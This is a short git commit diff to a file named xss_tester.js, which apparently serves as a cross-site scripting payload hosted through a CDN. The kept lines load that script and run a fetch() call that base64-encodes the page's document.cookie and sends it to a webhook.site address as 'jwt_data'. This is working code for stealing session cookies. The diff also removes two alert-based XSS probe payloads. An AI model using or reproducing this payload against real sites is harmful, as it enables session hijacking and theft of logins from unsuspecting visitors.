d22f959dd561b5fd6923fffba17d7aee738bc4f3
Nick <nicoflavius@gmail.com>
2026-01-11 20:52:24 +0100

    Update xss_tester.js

--- xss_tester.js
+++ xss_tester.js
@@ -1,4 +1,2 @@
 <script src='https://cdn.jsdelivr.net/gh/niiiick3/TestXSS/xss_tester.js'></script>
 fetch("https://webhook.site/#!/view/9410b426-f57a-42f0-9bb2-23fd5d54eeed/?jwt_data=" + btoa(document.cookie));
-"><svg><animatetransform onbegin=alert(1)>
-<img src=1 onerror=alert(2)>
